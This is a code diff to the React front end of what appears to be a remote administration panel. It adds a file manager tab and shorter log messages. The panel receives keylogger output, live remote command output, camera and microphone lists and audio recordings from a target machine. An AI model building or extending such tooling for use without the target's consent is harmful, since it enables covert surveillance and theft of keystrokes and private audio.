@@ -1,6 +1,7 @@
 ﻿import React, { useState, useEffect, useRef } from 'react';
 import './App.css';
 import ScreenshotTab from './ScreenshotTab';
+import FileManager from './FileManager';
 
 const App = () => {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
@@ -217,8 +218,15 @@ const App = () => {
   // Thêm log vào danh sách
   const addLog = (message, type = 'info') => {
     const timestamp = new Date().toLocaleTimeString();
+    
+    // Rút gọn message nếu quá dài (giữ 80 ký tự)
+    let displayMessage = message;
+    if (message.length > 80) {
+      displayMessage = message.substring(0, 77) + '...';
+    }
+    
     setLogs(prev => {
-      const newLogs = [...prev, { timestamp, message, type }];
+      const newLogs = [...prev, { timestamp, message: displayMessage, type }];
       // Giới hạn tối đa 100 logs, xóa các log cũ nhất
       if (newLogs.length > 100) {
         return newLogs.slice(-100); // Giữ 100 logs mới nhất
@@ -359,7 +367,10 @@ const App = () => {
           
           // Xử lý các loại response từ server
           if (data.type === 'ACTION_RESULT') {
-            addLog(data.msg, 'info');
+            // Rút gọn message nếu cần
+            const msg = data.msg || 'Action completed';
+            const shortMsg = msg.length > 60 ? msg.substring(0, 57) + '...' : msg;
+            addLog(shortMsg, data.success === false ? 'error' : 'info');
             
             // Đồng bộ keylog mode từ server response
             if (data.currentMode) {
@@ -370,12 +381,11 @@ const App = () => {
           else if (data.type === 'LIST_RESULT') {
             const processList = data.data;
             setProcessList(processList);
-            let logMsg = `Received ${processList.length} processes`;
-            addLog(logMsg, 'success');
+            addLog(`📋 ${processList.length} processes loaded`, 'success');
           }
           else if (data.type === 'KEYLOG_RESULT') {
             setBufferKeylog(data.data);
-            addLog(`Keylog received (${data.data.length} characters)`, 'success');
+            addLog(`⌨️ Keylog: ${data.data.length} chars`, 'success');
           }
           else if (data.type === 'KEYLOG_REALTIME') {
             // Real-time keylog data
@@ -393,7 +403,7 @@ const App = () => {
             setTargetIP(data.ip);
             setWsPort(data.port);
             setIsDetectingIP(false);
-            addLog(`Server IP detected: ${data.ip}:${data.port}`, 'success');
+            addLog(`📍 ${data.ip}:${data.port}`, 'success');
           }
           else if (data.type === 'CMD_OUTPUT') {
             // Real-time CMD output
@@ -409,7 +419,8 @@ const App = () => {
           else if (data.type === 'CMD_STATUS') {
             setCmdRunning(data.running);
             if (data.msg) {
-              addLog(data.msg, 'info');
+              const shortMsg = data.msg.length > 50 ? data.msg.substring(0, 47) + '...' : data.msg;
+              addLog(shortMsg, 'info');
             }
           }
           else if (data.type === 'CMD_PROCESS_ENDED') {
@@ -439,12 +450,12 @@ const App = () => {
           else if (data.type === 'CAMERA_LIST') {
             setAvailableCameras(data.data);
             setIsScanningCameras(false);
-            addLog(`Found ${data.data.length} camera(s)`, 'success');
+            addLog(`🎥 ${data.data.length} camera(s)`, 'success');
           }
           else if (data.type === 'MIC_LIST') {
             setAvailableMics(data.data);
             setIsScanningMics(false);
-            addLog(`Found ${data.data.length} microphone(s)`, 'success');
+            addLog(`🎤 ${data.data.length} mic(s)`, 'success');
           }
           else if (data.type === 'AUDIO_RESULT') {
             // Clear audio recording timer
@@ -455,7 +466,7 @@ const App = () => {
             setIsRecordingAudio(false);
             setAudioRecordCountdown(0);
             setAudioData(data.data);
-            addLog('Audio recording completed!', 'success');
+            addLog('🎧 Audio recorded', 'success');
           }
           else if (data.type === 'AUDIO_CHUNK') {
             // Play live audio chunk using Web Audio API
@@ -1244,6 +1255,12 @@ const App = () => {
             >
               💻 CMD Terminal
             </button>
+            <button
+              className={`tab ${activeTab === 'files' ? 'active' : ''}`}
+              onClick={() => setActiveTab('files')}
+            >
+              📁 File Manager
+            </button>
           </div>
 
           <div className="tab-content">
@@ -1907,6 +1924,11 @@ const App = () => {
                   </div>
                 </div>
               </div>
+            )}
+
+            {/* File Manager Tab */}
+            {activeTab === 'files' && (
+              <FileManager ws={ws} addLog={addLog} />
             )}
           </div>
         </div>
